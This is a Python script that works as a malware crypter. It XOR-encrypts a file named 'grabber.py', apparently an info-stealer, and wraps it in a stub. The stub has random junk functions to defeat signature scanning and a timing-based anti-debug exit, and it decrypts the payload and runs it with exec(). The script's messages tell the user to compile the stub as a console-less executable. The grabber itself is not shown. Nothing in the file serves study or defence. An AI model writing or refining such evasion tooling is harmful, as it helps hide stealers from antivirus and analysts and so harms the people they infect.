import os
import random
import string
import base64

def get_random_string(length):
    return ''.join(random.choice(string.ascii_letters) for i in range(length))

def xor_encrypt(data, key):
    return bytearray([b ^ key[i % len(key)] for i, b in enumerate(data)])

def generate_junk_code():

    ops = ['+', '-', '*', '/']
    code = ""
    for _ in range(random.randint(3, 6)):
        func_name = get_random_string(8)
        var1 = get_random_string(4)
        var2 = get_random_string(4)
        code += f"""
def {func_name}({var1}, {var2}):
    # Math calculation
    res = {var1} {random.choice(ops)} {var2}
    if res > 100:
        return res - 10
    return res
"""
    return code

def build_stub(payload_bytes):

    key = get_random_string(16)
    key_bytes = key.encode()
    
    encrypted = xor_encrypt(payload_bytes, key_bytes)
    
    encrypted_list = list(encrypted)
    
    stub_code = f"""
import sys
import time
import ctypes
import math

# --- JUNK CODE START ---
{generate_junk_code()}
# --- JUNK CODE END ---

def _d():
    # Anti-Debug check (Simple time check)
    t1 = time.time()
    x = 0
    for i in range(100000):
        x += 1
    t2 = time.time()
    if (t2 - t1) > 1.0: # If it took too long, maybe being debugged
        sys.exit()

def _x(d, k):
    return bytearray([b ^ k[i % len(k)] for i, b in enumerate(d)])

def run():
    _d()
    
    # Reconstruct Key
    k = "{key}".encode()
    
    # Encrypted Data
    e = {encrypted_list}
    
    # Decrypt
    dec = _x(e, k)
    
    # Execute
    try:
        exec(dec.decode())
    except Exception as e:
        pass

if __name__ == "__main__":
    run()
"""
    return stub_code

def main():
    if not os.path.exists("grabber.py"):
        print("grabber.py bulunamadi!")
        return

    print("Reading grabber.py...")
    with open("grabber.py", "rb") as f:
        content = f.read()

    print("Applying XOR Encryption & Junk Code...")
    stub_content = build_stub(content)

    print("Writing stub.py...")
    with open("stub.py", "w", encoding="utf-8") as f:
        f.write(stub_content)
    
    print("SUCCESS! Yeni stub.py hazir.")
    print("Simdi tekrar build al:")
    print("pyinstaller --onefile --noconsole stub.py")

if __name__ == "__main__":
    main()
